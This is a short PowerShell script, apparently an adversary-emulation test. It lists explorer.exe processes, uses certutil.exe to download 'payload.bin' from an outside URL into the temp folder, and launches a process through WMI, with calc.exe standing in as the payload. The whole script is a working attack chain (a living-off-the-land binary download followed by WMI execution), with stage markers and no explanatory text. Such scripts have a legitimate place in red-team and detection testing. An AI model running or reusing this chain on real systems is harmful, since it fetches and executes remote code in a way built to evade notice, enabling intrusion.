
[CmdletBinding()]
param(
    [string]$EndpointUrl = "https://internal.corp/payload.bin",
    [string]$PayloadPath = "$env:TEMP\payload.bin",
    [int]$TimeoutSec = 38
)
$ErrorActionPreference = "Continue"

try {
    Write-Verbose "Collecting process inventory"
    Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "$env:TEMP\report.txt" -Append
    certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
    $TransferResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" }
    Write-Verbose ("Process ID: " + $TransferResult.ProcessId)
}
catch {
    Write-Warning "WMI/LOLBin stage failed: $($_.Exception.Message)"
}

Write-Verbose "stage marker 5 reached"
Start-Sleep -Seconds 30
$StageMarker = "stage-38"
